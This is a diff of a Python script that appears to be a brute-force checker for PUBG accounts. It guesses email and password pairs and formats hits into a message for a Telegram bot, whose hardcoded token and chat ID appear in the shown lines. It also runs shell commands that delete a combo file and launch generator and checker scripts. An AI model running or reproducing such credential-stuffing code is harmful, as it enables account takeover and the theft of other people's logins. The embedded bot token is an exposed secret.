@@ -43,12 +43,6 @@ $$$$$$$$$$$$$$$$$$$$$$$$$$$$
 """)
 ID= '948449142'
 token = '1709758707:AAErgzajdRujR5g_uIaP4YT_F9Qr8bJHIOs'
-YES = f"""
-[✓]بوجبا بيمسي عليكم و ع ببجي😂❤️:
-[✓] Email: {user}
-[✓] Pass: {pasw}
-[✓] BY💥@@hazemmo2312-@Hazemmo23_bot
-━━━━━━━━━━━━━"""
 print(banner)
 def Guess_without_proxies(user,pasw):
     global hunt,error,bad,banner
@@ -207,6 +201,12 @@ else:
             Guess_without_proxies(user,pasw)
         except:
             pass
+YES = f"""
+[✓]بوجبا بيمسي عليكم و ع ببجي😂❤️:
+[✓] Email: {user}
+[✓] Pass: {pasw}
+[✓] BY💥@@hazemmo2312-@Hazemmo23_bot
+━━━━━━━━━━━━━"""
 os.system('rm -rif combo.txt')
 os.system('python3 gen.py')
 os.system('python3 checkerq.py')
